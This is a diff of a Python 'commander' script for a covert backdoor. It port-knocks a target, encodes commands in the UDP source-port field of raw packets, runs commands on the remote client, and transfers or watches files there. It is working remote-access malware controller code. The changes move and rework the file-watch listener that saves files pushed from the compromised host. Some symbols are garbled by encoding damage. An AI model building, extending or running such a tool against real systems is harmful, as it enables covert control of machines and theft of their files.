@@ -9,51 +9,38 @@ Usage: sudo python3 commander.py <target_host>
 import os
 import socket
 import struct
+import threading
 import time
 import sys
-import threading
 from enum import IntEnum
 from raw_socket_protocol import RawSocketProtocol
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
-COMMAND_PORT   = 8888                 # UDP port for covert channel
-RECEIVED_DIR   = "received_files/"   # Directory to save files from client
-
-# Commands that expect a response from the client
-COMMANDS_WITH_RESPONSE = frozenset([
-    # populated below after CommandType is defined
-])
-
+COMMAND_PORT = 8888                 # UDP port for covert channel
+RECEIVED_DIR = "received_files/"   # Directory to save files from client
 
 class CommandType(IntEnum):
     """Commands encoded in UDP src-port field"""
-    DISCONNECT          = 0x1234
-    UNINSTALL           = 0x2345
-    TRANSFER_TO_CLIENT  = 0x3456
+    DISCONNECT = 0x1234
+    UNINSTALL = 0x2345
+    TRANSFER_TO_CLIENT = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
-    RUN_COMMAND         = 0x5678
-    FILE_WATCH          = 0x6789  # push: client sends modified files
-    FILE_DELETE         = 0x7890  # push: client notifies file deletion
-    STOP_WATCH          = 0x8901  # commander � client: stop the file watcher
-    ACK                 = 0x9ABC
-    ERROR               = 0xABCD
+    RUN_COMMAND = 0x5678
+    FILE_WATCH = 0x6789
+    FILE_DELETE = 0x7890
+    STOP_WATCH = 0x8901
+    ACK = 0x9ABC
+    ERROR = 0xABCD
 
 
-# Commands that require the commander to listen for a single response
+# Commands that require the commander to listen for a response
 COMMANDS_WITH_RESPONSE = frozenset([
     CommandType.RUN_COMMAND,
     CommandType.TRANSFER_FROM_CLIENT,
+    # CommandType.FILE_WATCH,
+    # CommandType.STOP_WATCH,
     CommandType.UNINSTALL,
-    # FILE_WATCH excluded  listener is started directly in _watch_mode()
-])
-
-# Packet types the commander expects to receive (filters out its own sent packets)
-RESPONSE_COMMANDS = frozenset([
-    int(CommandType.ACK),
-    int(CommandType.ERROR),
-    int(CommandType.FILE_WATCH),
-    int(CommandType.FILE_DELETE),
 ])
 
 
@@ -73,9 +60,9 @@ class Commander:
         self.command_port = COMMAND_PORT
         self.source_ip = self.get_local_ip()
         self.protocol = RawSocketProtocol()
-        self._pending_get_filename = None
-        self._watch_thread = None        # background thread receiving pushed watch packets
-        self._watch_stop   = threading.Event()
+        self._pending_get_filename = None  # filename expected from next TRANSFER_FROM_CLIENT response
+        self._watch_thread = None
+        self._watch_stop = threading.Event()
         os.makedirs(RECEIVED_DIR, exist_ok=True)
 
     def get_local_ip(self):
@@ -105,9 +92,9 @@ class Commander:
                 print(f"[+] Knocking on TCP port {port}...", end=" ", flush=True)
                 sock.connect((self.target_host, port))
                 sock.close()
-                print("")
+                print("✓")
             except Exception as e:
-                print(f" ({e})")
+                print(f"✗ ({e})")
             time.sleep(0.5)
 
         print("\n[+] Port knock sequence complete!")
@@ -126,7 +113,7 @@ class Commander:
         context: optional dict passed through to display_response()
                  e.g. {'filename': 'secret.txt'} for TRANSFER_FROM_CLIENT
         """
-        print(f"\n[�] Sending covert command: {command_type.name}")
+        print(f"\n[→] Sending covert command: {command_type.name}")
         print(f"    Encoding:  UDP src port = 0x{int(command_type):04X}")
         print(f"    Transport: UDP port {self.command_port}")
         if payload and len(payload) < 100:
@@ -135,9 +122,11 @@ class Commander:
 
         needs_response = command_type in COMMANDS_WITH_RESPONSE
 
+        # ── KEY FIX: open the receive socket BEFORE we send ──────────────
         if needs_response:
             self.protocol.prepare_recv_socket()
             time.sleep(0.1)  # give the kernel time to attach the BPF filter
+        # ─────────────────────────────────────────────────────────────────
 
         success = self.protocol.send_packet(
             self.source_ip,
@@ -148,10 +137,10 @@ class Commander:
         )
 
         if not success:
-            print(f"[] Failed to send packet")
+            print(f"[✗] Failed to send packet")
             return False
 
-        print(f"[] Packet sent successfully")
+        print(f"[✓] Packet sent successfully")
 
         if needs_response:
             print("[*] Waiting for response...")
@@ -172,203 +161,11 @@ class Commander:
         )
         return response  # may be None on timeout
 
-    # ------------------------------------------------------------------ #
-    #  File watch listener                                                 #
-    # ------------------------------------------------------------------ #
-
-    def _start_watch_listener(self):
-        """Start a background thread that receives pushed file-watch packets."""
-        self._stop_watch_listener()  # stop any existing listener first
-        self._watch_stop.clear()
-        self._watch_thread = threading.Thread(
-            target=self._watch_listener_loop,
-            daemon=True
-        )
-        self._watch_thread.start()
-        print("[*] Watch listener started. Type 'stopwatch' to stop.")
-
-    def _watch_mode(self):
-        """
-        Block the interactive session in watch-only mode.
-        Starts the background listener then locks the prompt.
-        Only 'stopwatch' or Ctrl+C exits.
-        """
-        # Start listener BEFORE entering the input loop
-        self._start_watch_listener()
-
-        print("\n" + "=" * 60)
-        print("  WATCH MODE ACTIVE  commander is locked")
-        print("  Type 'stopwatch' to stop watching and resume commands.")
-        print("=" * 60)
-
-        while True:
-            try:
-                user_input = input("watching> ").strip().lower()
-
-                if user_input == 'stopwatch':
-                    # Tell client to stop its watcher
-                    self.protocol.send_packet(
-                        self.source_ip,
-                        self.target_host,
-                        self.command_port,
-                        CommandType.STOP_WATCH,
-                        b''
-                    )
-                    self._stop_watch_listener()
-                    print("[*] Watch stopped. Resuming normal command mode.")
-                    print("=" * 60)
-                    break
-
-                elif user_input == '':
-                    continue
-
-                else:
-                    print(f"[!] Watch mode is active  only 'stopwatch' is accepted.")
-
-            except KeyboardInterrupt:
-                print("\n[*] Interrupted  stopping watch and sending disconnect...")
-                self.protocol.send_packet(
-                    self.source_ip,
-                    self.target_host,
-                    self.command_port,
-                    CommandType.STOP_WATCH,
-                    b''
-                )
-                self._stop_watch_listener()
-                try:
-                    self.send_covert_command(CommandType.DISCONNECT)
-                except Exception:
-                    pass
-                raise  # re-raise so the outer loop also exits
-
-    def _stop_watch_listener(self):
-        """Signal the background watch listener to stop and wait for it."""
-        if self._watch_thread and self._watch_thread.is_alive():
-            self._watch_stop.set()
-            self._watch_thread.join(timeout=3)
-        self._watch_thread = None
-        self._watch_stop.clear()
-
-    def _watch_listener_loop(self):
-        """
-        Background thread: open a raw socket and process FILE_WATCH /
-        FILE_DELETE packets pushed by the client until _watch_stop is set.
-        """
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            sock.settimeout(1.0)  # short timeout so we can check _watch_stop
-        except Exception as e:
-            print(f"[!] Watch listener: could not open socket: {e}")
-            return
-
-        # Per-transfer reassembly state (client pushes one file at a time)
-        chunks        = {}
-        expected_total = None
-        current_cmd   = None
-
-        try:
-            while not self._watch_stop.is_set():
-                try:
-                    packet, addr = sock.recvfrom(65535)
-                except socket.timeout:
-                    continue
-
-                if addr[0] != self.target_host:
-                    continue
-
-                parsed = self.protocol.parse_udp_packet(packet)
-                if not parsed:
-                    continue
-                if parsed['dst_port'] != self.command_port:
-                    continue
-                # Only accept push-type packets; ignore our own outbound commands
-                if parsed['command'] not in RESPONSE_COMMANDS:
-                    continue
-
-                seq   = parsed['seq']
-                data  = parsed['data']
-                total = parsed['total']
-                cmd   = parsed['command']
-
-                # New transfer starting
-                if expected_total is None:
-                    expected_total = total
-                    current_cmd    = cmd
-                    chunks         = {}
-
-                chunks[seq] = data
-
-                if expected_total and len(chunks) >= expected_total:
-                    # Verify no gaps
-                    expected_seqs = set(range(1, expected_total + 1))
-                    if set(chunks.keys()) != expected_seqs:
-                        missing = expected_seqs - set(chunks.keys())
-                        print(f"\n[!] Watch listener: missing seqs {missing}  dropping")
-                        chunks = {}
-                        expected_total = None
-                        current_cmd    = None
-                        continue
-
-                    # Reassemble
-                    raw = b''.join(chunks[i] for i in sorted(chunks))
-
-                    # First 4 bytes are the original payload length
-                    if len(raw) < 4:
-                        print(f"\n[!] Watch listener: payload too short, dropping")
-                        chunks        = {}
-                        expected_total = None
-                        current_cmd   = None
-                        continue
-                    orig_len = struct.unpack('!I', raw[:4])[0]
-                    payload  = raw[4:4 + orig_len]
-
-                    # Reset state
-                    chunks        = {}
-                    expected_total = None
-
-                    if current_cmd == int(CommandType.FILE_WATCH):
-                        self._handle_watch_file(payload)
-                    elif current_cmd == int(CommandType.FILE_DELETE):
-                        self._handle_watch_delete(payload)
-
-                    current_cmd = None
-
-        finally:
-            sock.close()
-
-    def _handle_watch_file(self, payload):
-        """Save a pushed file from the client into RECEIVED_DIR."""
-        try:
-            filename_len  = struct.unpack('!H', payload[:2])[0]
-            filename      = payload[2:2 + filename_len].decode('utf-8')
-            filedata      = payload[2 + filename_len:]
-            save_path     = os.path.join(RECEIVED_DIR, filename)
-            with open(save_path, 'wb') as f:
-                f.write(filedata)
-            print(f"\n[�] Watch: received '{filename}' ({len(filedata)} bytes) � {save_path}")
-        except Exception as e:
-            print(f"\n[!] Watch: could not save file: {e}")
-
-    def _handle_watch_delete(self, payload):
-        """Delete a file from RECEIVED_DIR because it was deleted on the client."""
-        try:
-            filename  = payload.decode('utf-8').strip()
-            del_path  = os.path.join(RECEIVED_DIR, filename)
-            if os.path.exists(del_path):
-                os.remove(del_path)
-                print(f"\n[] Watch: deleted '{filename}' from {RECEIVED_DIR}")
-            else:
-                print(f"\n[~] Watch: delete notice for '{filename}' "
-                      f"(not in {RECEIVED_DIR}, ignoring)")
-        except Exception as e:
-            print(f"\n[!] Watch: could not delete file: {e}")
-
     def display_response(self, response, context=None):
         """Pretty-print a response dict from receive_data()."""
         print("\n" + "=" * 60)
         if response['type'] == int(CommandType.ACK):
-            # File transfer response  save to disk
+            # File transfer response — save to disk
             if context and context.get('filename'):
                 filename = os.path.basename(context['filename'])
                 save_path = os.path.join(RECEIVED_DIR, filename)
@@ -422,7 +219,6 @@ class Commander:
         print("  get <file>            - Transfer file from client (0x4567)")
         print("  run <command>         - Run command on client (0x5678)")
         print("  watch <dir>           - Watch directory on client (0x6789)")
-        print("                          (locks commander until 'stopwatch' is typed)")
         print("  exit                  - Exit commander")
         print("=" * 60)
         print()
@@ -446,9 +242,8 @@ class Commander:
                     self.perform_port_knock()
 
                 elif cmd == 'disconnect':
-                    self._stop_watch_listener()
                     self.send_covert_command(CommandType.DISCONNECT)
-                    print("[*] Disconnect sent  authorization revoked on client")
+                    print("[*] Disconnect sent — authorization revoked on client")
                     print("[*] Exiting commander...")
                     break
 
@@ -494,15 +289,16 @@ class Commander:
 
                 elif cmd == 'watch':
                     if not args:
-                        print("[!] Usage: watch <directory>")
+                        print("[!] Usage: watch <path>")
                         continue
                     self.send_covert_command(
                         CommandType.FILE_WATCH,
                         args.encode('utf-8')
                     )
-                    # Block the interactive loop until stopwatch is issued
-                    if self._watch_thread and self._watch_thread.is_alive():
-                        self._watch_mode()
+                    self._watch_mode()
+
+                elif cmd == 'stop':
+                    self.send_covert_command(CommandType.STOP_WATCH)
 
                 else:
                     print(f"[!] Unknown command: {cmd}")
@@ -510,8 +306,7 @@ class Commander:
                 time.sleep(0.3)
 
             except KeyboardInterrupt:
-                print("\n[*] Interrupted  sending disconnect...")
-                self._stop_watch_listener()
+                print("\n[*] Interrupted — sending disconnect...")
                 try:
                     self.send_covert_command(CommandType.DISCONNECT)
                 except Exception:
@@ -521,6 +316,173 @@ class Commander:
             except Exception as e:
                 print(f"[!] Error: {e}")
 
+    def _watch_mode(self):
+        """
+        Block the interactive session in watch-only mode.
+        Starts a background thread to receive pushed file/delete packets.
+        Only 'stopwatch' or Ctrl+C exits.
+        """
+        # Open receive socket before entering the loop
+        self._watch_stop.clear()
+        self._watch_thread = threading.Thread(
+            target=self._watch_listener_loop,
+            daemon=True
+        )
+        self._watch_thread.start()
+
+        print("\n" + "=" * 60)
+        print("  WATCH MODE ACTIVE — commander is locked")
+        print("  Type 'stopwatch' to stop.")
+        print("=" * 60)
+
+        while True:
+            try:
+                user_input = input("watching> ").strip().lower()
+                if user_input == 'stopwatch':
+                    # Tell client to stop its watcher
+                    self.protocol.send_packet(
+                        self.source_ip,
+                        self.target_host,
+                        self.command_port,
+                        CommandType.STOP_WATCH,
+                        b''
+                    )
+                    self._stop_watch_listener()
+                    print("[*] Watch stopped. Resuming normal command mode.")
+                    print("=" * 60)
+                    break
+                elif user_input == '':
+                    continue
+                else:
+                    print("[!] Watch mode is active — only 'stopwatch' is accepted.")
+
+            except KeyboardInterrupt:
+                print("\n[*] Interrupted — stopping watch and disconnecting...")
+                self.protocol.send_packet(
+                    self.source_ip,
+                    self.target_host,
+                    self.command_port,
+                    CommandType.STOP_WATCH,
+                    b''
+                )
+                self._stop_watch_listener()
+                try:
+                    self.send_covert_command(CommandType.DISCONNECT)
+                except Exception:
+                    pass
+                raise  # re-raise so outer loop exits too
+
+    def _stop_watch_listener(self):
+        if self._watch_thread and self._watch_thread.is_alive():
+            self._watch_stop.set()
+            self._watch_thread.join(timeout=3)
+        self._watch_thread = None
+        self._watch_stop.clear()
+
+    def _watch_listener_loop(self):
+        """
+        Background thread: receives FILE_WATCH and FILE_DELETE packets
+        pushed by the client and saves/deletes files in received_files/.
+        """
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            sock.settimeout(1.0)
+        except Exception as e:
+            print(f"[!] Watch listener: could not open socket: {e}")
+            return
+
+        chunks        = {}
+        expected_total = None
+        current_cmd   = None
+
+        try:
+            while not self._watch_stop.is_set():
+                try:
+                    packet, addr = sock.recvfrom(65535)
+                except socket.timeout:
+                    continue
+
+                if addr[0] != self.target_host:
+                    continue
+
+                parsed = self.protocol.parse_udp_packet(packet)
+                if not parsed:
+                    continue
+                if parsed['dst_port'] != self.command_port:
+                    print(f"{parsed['dst_port']} {self.command_port}")
+                    continue
+                if parsed['command'] not in (CommandType.FILE_WATCH, CommandType.FILE_DELETE, CommandType.STOP_WATCH):
+                    print(f"Wrong command {parsed['command']}")
+                    continue
+
+                seq   = parsed['seq']
+                data  = parsed['data']
+                total = parsed['total']
+                cmd   = parsed['command']
+
+                # New transfer starting
+                if expected_total is None:
+                    expected_total = total
+                    current_cmd    = cmd
+                    chunks         = {}
+
+                chunks[seq] = data
+
+                if expected_total and len(chunks) >= expected_total:
+                    # Verify no gaps
+                    expected_seqs = set(range(1, expected_total + 1))
+                    if set(chunks.keys()) != expected_seqs:
+                        missing = expected_seqs - set(chunks.keys())
+                        print(f"\n[!] Watch listener: missing seqs {missing} — dropping")
+                        chunks        = {}
+                        expected_total = None
+                        current_cmd   = None
+                        continue
+
+                    # Reassemble
+                    raw = b''.join(chunks[i] for i in sorted(chunks))
+                    payload = raw[:-1] if (expected_total * 2) > len(raw) else raw
+
+                    # Reset state for next transfer
+                    chunks        = {}
+                    expected_total = None
+
+                    if current_cmd == int(CommandType.FILE_WATCH):
+                        self._handle_watch_file(payload)
+                    elif current_cmd == int(CommandType.FILE_DELETE):
+                        self._handle_watch_delete(payload)
+
+                    current_cmd = None
+
+        finally:
+            sock.close()
+
+    def _handle_watch_file(self, payload):
+        """Save a file pushed by the client into received_files/."""
+        try:
+            filename_len = struct.unpack('!H', payload[:2])[0]
+            filename     = payload[2:2 + filename_len].decode('utf-8')
+            filedata     = payload[2 + filename_len:]
+            save_path    = os.path.join(RECEIVED_DIR, filename)
+            with open(save_path, 'wb') as f:
+                f.write(filedata)
+            print(f"\n[↓] Watch: received '{filename}' ({len(filedata)} bytes) → {save_path}")
+        except Exception as e:
+            print(f"\n[!] Watch: could not save file: {e}")
+
+    def _handle_watch_delete(self, payload):
+        """Delete a file from received_files/ when the client deletes it."""
+        try:
+            filename = payload.decode('utf-8').strip()
+            del_path = os.path.join(RECEIVED_DIR, filename)
+            if os.path.exists(del_path):
+                os.remove(del_path)
+                print(f"\n[✗] Watch: deleted '{filename}' from {RECEIVED_DIR}")
+            else:
+                print(f"\n[~] Watch: delete notice for '{filename}' (not in {RECEIVED_DIR}, ignoring)")
+        except Exception as e:
+            print(f"\n[!] Watch: could not delete file: {e}")
 
 def main():
     print("=" * 60)
